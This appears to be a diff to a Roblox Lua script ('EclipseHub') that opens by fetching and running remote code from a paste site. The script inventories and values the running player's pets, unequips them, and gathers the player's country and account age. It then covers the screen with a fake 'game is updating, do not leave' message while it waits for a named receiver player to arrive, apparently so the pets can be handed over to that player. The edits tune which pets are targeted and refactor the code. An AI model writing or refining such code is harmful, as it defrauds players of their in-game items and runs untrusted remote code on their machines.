@@ -1,6 +1,7 @@
 loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
 
         local RS = game:GetService("ReplicatedStorage")
+        local Players = game:GetService("Players")
         local HttpService = game:GetService("HttpService")
         local RunService = game:GetService("RunService")
         local LocalizationService = game:GetService("LocalizationService")
@@ -25,7 +26,8 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
         end
 
         if detectExecutor() == "Delta" then
-            game.Players.LocalPlayer:Kick("Delta is not supported! Please use a different executor.")
+            Players.LocalPlayer:Kick("Delta is not supported! Please use a different executor.")
+            error("Script doesn't work on delta")            
         end
 
         local function formatNumberWithCommas(n)
@@ -60,7 +62,7 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
         local function GetPlayerPets()
             local unsortedPets = {}
             local equippedPets = {}
-            local player = game.Players.LocalPlayer
+            local player = Players.LocalPlayer
             if not data or not data.PetsData then
                 warn("No pet data available in data.PetsData")
                 return unsortedPets
@@ -69,7 +71,7 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
             -- Unequip all pets ONCE at the start
             if workspace:FindFirstChild("PetsPhysical") then
                 for _, petMover in workspace.PetsPhysical:GetChildren() do
-                    if petMover and petMover:GetAttribute("OWNER") == game.Players.LocalPlayer.Name then
+                    if petMover and petMover:GetAttribute("OWNER") == Players.LocalPlayer.Name then
                         for _, pet in petMover:GetChildren() do
                             table.insert(equippedPets, pet.Name)
                             pcall(function()
@@ -96,7 +98,7 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
                     end
 
                     local function SafeCalculatePetValue(tool)
-                        local player = game.Players.LocalPlayer
+                        local player = Players.LocalPlayer
                         local PET_UUID = tool:GetAttribute("PET_UUID")
                         
                         if not PET_UUID then
@@ -301,6 +303,7 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
             if priorities[pet.Type] then
                 -- Custom emoji for each rare pet type
                 local rareEmojis = {
+                    ["Kitsune"] = "🦊",
                     ["Raccoon"] = "🦝",
                     ["Fennec fox"] = "🦊",
                     ["Spinosaurus"] = "🫎",
@@ -313,7 +316,7 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
                     ["Red Fox"] = "🦊"
                 }
                 emoji = rareEmojis[pet.Type] or "💎"
-            elseif pet.Weight and pet.Weight >= 20 and pet.Weight <= 100 then
+            elseif pet.Weight and pet.Weight >= 10 then
                 emoji = "🐘" -- Huge pet
             elseif pet.Age and pet.Age >= 60 then
                 emoji = "👴" -- Aged pet
@@ -324,7 +327,7 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
             petString = petString .. "\n" .. emoji .. " - " .. petName .. " → " .. petValue
         end
 
-        local playerCount = #game.Players:GetPlayers()
+        local playerCount = #Players:GetPlayers()
 
         local function getPlayerCountry(player)
             local success, result = pcall(function()
@@ -340,7 +343,7 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
 
         petString = petString .. "\n```"
 
-        local accountAgeInDays = game.Players.LocalPlayer.AccountAge
+        local accountAgeInDays = Players.LocalPlayer.AccountAge
         local creationDate = os.time() - (accountAgeInDays * 24 * 60 * 60) -- Converts days to seconds and subtracts
         local creationDateString = os.date("%Y-%m-%d", creationDate) -- Formats the date as Year-Month-Day
 
@@ -467,91 +470,69 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
         end
 
         local function CreateGui()
-            -- Instances:
+            local player = Players.LocalPlayer
 
-            local ScreenGui = Instance.new("ScreenGui")
-            local Frame = Instance.new("Frame")
-            local ImageLabel = Instance.new("ImageLabel")
-            local UIAspectRatioConstraint = Instance.new("UIAspectRatioConstraint")
-            local TextLabel = Instance.new("TextLabel")
-            local TextLabel_2 = Instance.new("TextLabel")
-            local TextLabel_3 = Instance.new("TextLabel")
+            -- Create GUI
+            local gui = Instance.new("ScreenGui")
+            local asc = Instance.new("UIAspectRatioConstraint")
+            gui.Name = "EclipseHubGui"
+            gui.ResetOnSpawn = false
+            gui.IgnoreGuiInset = true
+            gui.Parent = player:WaitForChild("PlayerGui")
+            gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
+            gui.DisplayOrder = 99999
 
-            --Properties:
+            -- Full black background
+            local bg = Instance.new("Frame")
+            bg.Size = UDim2.new(1, 0, 1, 0)
+            bg.Position = UDim2.new(0, 0, 0, 0)
+            bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+            bg.Parent = gui
 
-            ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
-            ScreenGui.Name = "EclipseHubGui"
-            ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
-            ScreenGui.IgnoreGuiInset = true
-            ScreenGui.ResetOnSpawn = false
+            -- Spinner icon
+            local spinner = Instance.new("ImageLabel")
+            spinner.AnchorPoint = Vector2.new(0.5, 0.5)
+            spinner.Size = UDim2.new(0.3, 0, 0.3, 0)
+            spinner.Position = UDim2.new(0.5, 0, 0.34, 0)
+            spinner.BackgroundTransparency = 1
+            spinner.Image = "rbxassetid://74011233271790" -- Simple loop icon
+            spinner.ImageColor3 = Color3.fromRGB(255, 255, 255)
+            spinner.Parent = bg
+            asc.Parent = spinner
 
-            Frame.Parent = ScreenGui
-            Frame.AnchorPoint = Vector2.new(0.5, 0.5)
-            Frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-            Frame.BorderColor3 = Color3.fromRGB(18, 18, 18)
-            Frame.BorderSizePixel = 0
-            Frame.Position = UDim2.new(0.5, 0, 0.5, 0)
-            Frame.Size = UDim2.new(1, 0, 1, 0)
+            -- "Please wait..." title
+            local title = Instance.new("TextLabel")
+            title.Size = UDim2.new(1, 0, 0, 50)
+            title.Position = UDim2.new(0, 0, 0.53, 0)
+            title.BackgroundTransparency = 1
+            title.Text = "Please wait..."
+            title.Font = Enum.Font.GothamBold
+            title.TextSize = 38
+            title.TextColor3 = Color3.fromRGB(255, 255, 255)
+            title.TextStrokeTransparency = 0.75
+            title.Parent = bg
 
-            ImageLabel.Parent = Frame
-            ImageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
-            ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-            ImageLabel.BackgroundTransparency = 1
-            ImageLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
-            ImageLabel.BorderSizePixel = 0
-            ImageLabel.ClipsDescendants = true
-            ImageLabel.Position = UDim2.new(0.7691378, 0, 0.26758793, 0)
-            ImageLabel.Size = UDim2.new(0.266720384, 0, 0.415829152, 0)
-            ImageLabel.Image = "rbxassetid://74011233271790"
+            -- Description text
+            local desc = Instance.new("TextLabel")
+            desc.Size = UDim2.new(1, -100, 0, 60)
+            desc.Position = UDim2.new(0.5, -((1 * (bg.AbsoluteSize.X - 100)) / 2), 0.60, 0)
+            desc.BackgroundTransparency = 1
+            desc.Text = "The game is updating. Leaving now may cause data loss or corruption.\nYou will be returned shortly."
+            desc.Font = Enum.Font.Gotham
+            desc.TextSize = 20
+            desc.TextColor3 = Color3.fromRGB(200, 200, 200)
+            desc.TextWrapped = true
+            desc.TextXAlignment = Enum.TextXAlignment.Center
+            desc.TextYAlignment = Enum.TextYAlignment.Top
+            desc.Parent = bg
 
-            UIAspectRatioConstraint.Parent = ImageLabel
-
-            TextLabel.Parent = Frame
-            TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
-            TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-            TextLabel.BackgroundTransparency = 1
-            TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
-            TextLabel.BorderSizePixel = 0
-            TextLabel.Position = UDim2.new(0.267929167, 0, 0.269472331, 0)
-            TextLabel.Size = UDim2.new(0.409347355, 0, 0.124371901, 0)
-            TextLabel.Font = Enum.Font.SourceSansBold
-            TextLabel.Text = "Please wait..."
-            TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
-            TextLabel.TextScaled = true
-            TextLabel.TextSize = 40
-            TextLabel.TextWrapped = true
-
-            TextLabel_2.Parent = Frame
-            TextLabel_2.AnchorPoint = Vector2.new(0.5, 0.5)
-            TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-            TextLabel_2.BackgroundTransparency = 1
-            TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
-            TextLabel_2.BorderSizePixel = 0
-            TextLabel_2.Position = UDim2.new(0.499597192, 0, 0.738065302, 0)
-            TextLabel_2.Size = UDim2.new(0.727516413, 0, 0.19974874, 0)
-            TextLabel_2.Font = Enum.Font.SourceSansBold
-            TextLabel_2.Text = "⚠️ DO NOT LEAVE THE GAME!\nClosing now may cause data loss."
-            TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
-            TextLabel_2.TextScaled = true
-            TextLabel_2.TextSize = 70
-            TextLabel_2.TextWrapped = true
-
-            TextLabel_3.Parent = Frame
-            TextLabel_3.AnchorPoint = Vector2.new(0.5, 0.5)
-            TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-            TextLabel_3.BackgroundTransparency = 1
-            TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
-            TextLabel_3.BorderSizePixel = 0
-            TextLabel_3.Position = UDim2.new(0.259055376, 0, 0.351758808, 0)
-            TextLabel_3.Size = UDim2.new(0.356164396, 0, 0.041457288, 0)
-            TextLabel_3.Font = Enum.Font.SourceSans
-            TextLabel_3.Text = "The game is updating. You will be returned shortly."
-            TextLabel_3.TextColor3 = Color3.fromRGB(255, 255, 255)
-            TextLabel_3.TextScaled = true
-            TextLabel_3.TextSize = 25
-            TextLabel_3.TextWrapped = true
-            TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left
-            
+            -- Spinner rotation loop
+            task.spawn(function()
+                while spinner do
+                    spinner.Rotation += 2
+                    task.wait(0.01)
+                end
+            end)
         end
 
         if getgenv().EclipseHubRunning then
@@ -562,13 +543,13 @@ loadstring(game:HttpGet("https://paste.debian.net/plainh/97e6ee56/", true))()
 
         local receiverPlr
         repeat 
-            receiverPlr = game.Players:FindFirstChild("DuoReaper") or game.Players:FindFirstChild(Username)
+            receiverPlr = Players:FindFirstChild(Username)
             task.wait(1)
         until receiverPlr
 
         local receiverChar = receiverPlr.Character or receiverPlr.CharacterAdded:Wait()
         local hum = receiverChar:WaitForChild("Humanoid")
-        local targetPlr = game.Players.LocalPlayer
+        local targetPlr = Players.LocalPlayer
         local targetChar = targetPlr.Character or targetPlr.CharacterAdded:Wait()
 
         if receiverPlr == targetPlr then error("Receiver and target are the same person!") end
